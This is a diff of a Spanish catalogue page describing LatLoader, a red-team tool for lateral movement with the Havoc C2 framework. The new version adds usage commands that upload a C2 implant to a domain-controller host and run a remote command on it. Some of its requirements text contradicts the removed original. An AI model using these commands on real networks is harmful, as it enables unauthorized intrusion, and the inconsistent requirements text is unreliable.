@@ -1,11 +1,11 @@
 ---
-title: "LatLoader: PoC module to demonstrate automated lateral movement with the Havoc C2 framework"
+title: "LatLoader: el salto silencioso entre equipos de una red"
 slug: "latloader"
-summary: "PoC module to demonstrate automated lateral movement with the Havoc C2 framework."
+summary: "LatLoader: movimiento lateral y ejecución remota en redes Windows."
 category: "ciberseguridad"
-level: "Intermedio"
-reading: 6
-tags: ['lateral-movement', 'red-team']
+level: "Avanzado"
+reading: 7
+tags: ["movimiento-lateral", "red-team", "ciberseguridad"]
 updated: "2026-11-01"
 featured: false
 order: 999
@@ -13,49 +13,49 @@ order: 999
 
 ## Qué es LatLoader
 
-LatLoader es una herramienta de seguridad ofensiva / red team. PoC module to demonstrate automated lateral movement with the Havoc C2 framework.
+**LatLoader** es una herramienta de código abierto orientada a operaciones de red team y adversary simulation. El movimiento lateral permite pasar de un host a otro usando credenciales, servicios y confianza interna, hasta alcanzar los objetivos.
 
-Forma parte del ecosistema de herramientas de adversary simulation y es útil para comprender cómo operan los atacantes y cómo detectar sus técnicas.
+> Descripción oficial: PoC module to demonstrate automated lateral movement with the Havoc C2 framework.
 
-- **Repositorio oficial:** [https://github.com/icyguider/LatLoader](https://github.com/icyguider/LatLoader)
-- **Sección del toolkit:** Lateral Movement 
+## Para qué sirve
 
-## Objetivo y función
+LatLoader se utiliza en la fase de **movimiento lateral**. Su función es automatizar o simplificar una tarea técnica que, hecha a mano, consumiría tiempo y aumentaría el riesgo de errores.
 
-El objetivo principal de LatLoader es poc module to demonstrate automated lateral movement with the havoc c2 framework.
-
-En un engagement de red team, esta herramienta se usa para automatizar o simplificar una fase concreta del ataque (reconocimiento, acceso inicial, movimiento lateral, evasión, etc.), reduciendo el tiempo manual y aumentando la cobertura.
+En la práctica, se integra en cadenas de ataque sobre Windows y Active Directory, donde el operador necesita ejecución fiable y controlada.
 
 ## Instalación
 
-This module was designed to work on Linux systems with `mingw-w64` installed. Additionally, you must have [osslsigncode](https://github.com/mtrojnar/osslsigncode) installed to provide cert signing for the DLL utilized by the `sideload` subcommand. Once all dependencies are installed, simply type `make` and then load the module into Havoc using the script manager. To view help in Havoc, run `help LatLoader`. To view help for subcommands, run `help LatLoader [subcommand]`.
+```bash
+git clone https://github.com/icyguider/LatLoader
+cd LatLoader
+```
 
-![help](https://github.com/icyguider/LatLoader/assets/79864975/340d7cf5-2307-48ef-9e7c-fcd8f7cb103b)
+> Revisa el README oficial para dependencias específicas, versiones y notas de compilación.
 
 ## Uso básico
 
-Consulta el README oficial para la sintaxis exacta. Un flujo típico:
-
 ```bash
-# Clonar
-git clone https://github.com/icyguider/LatLoader
-cd latloader
-
-# Revisar ayuda
-./latloader --help 2>/dev/null || python3 -m latloader --help 2>/dev/null || true
+LatLoader rupload dc1 /root/demon.x64.exe C:\Windows\Temp\test.exe
 ```
 
-> Adapta los comandos a tu entorno. Muchas de estas herramientas requieren privilegios elevados o sistemas Windows/Active Directory.
+```bash
+LatLoader exec dc1 "cmd.exe /c whoami > C:\poc.txt"
+```
 
-## ¿Se puede usar en Termux?
+## Compatibilidad y requisitos
 
-Este repositorio puede instalarse en Termux si el dispositivo cumple los requisitos (Python/Go/Rust y dependencias). En Android, ejecuta los comandos dentro de Termux y verifica permisos de red/almacenamiento.
+- **Lenguaje principal:** C++
+- **Última actualización del repositorio:** 2023-12-09
+- **Estrellas en GitHub:** 315
+- **Termux:** no
 
-## Buenas prácticas y ética
+**Requiere Windows o un entorno Windows.** Esta herramienta está diseñada para Windows, .NET, Active Directory o Cobalt Strike. No se ejecuta de forma nativa en Termux; úsala en una máquina virtual, un laboratorio aislado o un equipo de pruebas con Windows.
 
-Usa LatLoader únicamente en entornos que poseas o para los que tengas autorización escrita. El uso no autorizado es ilegal. En laboratorios, monta una VM aislada y una red de pruebas.
+## Ética y alcance
+
+Usa LatLoader únicamente en sistemas propios o con autorización escrita. El uso no autorizado es ilegal. En laboratorio, aísla la red, documenta cada paso y respeta el alcance acordado.
 
 ## Referencias
 
-- Repositorio: https://github.com/icyguider/LatLoader
+- Repositorio oficial: https://github.com/icyguider/LatLoader
 - Toolkit de origen: Red Teaming Toolkit
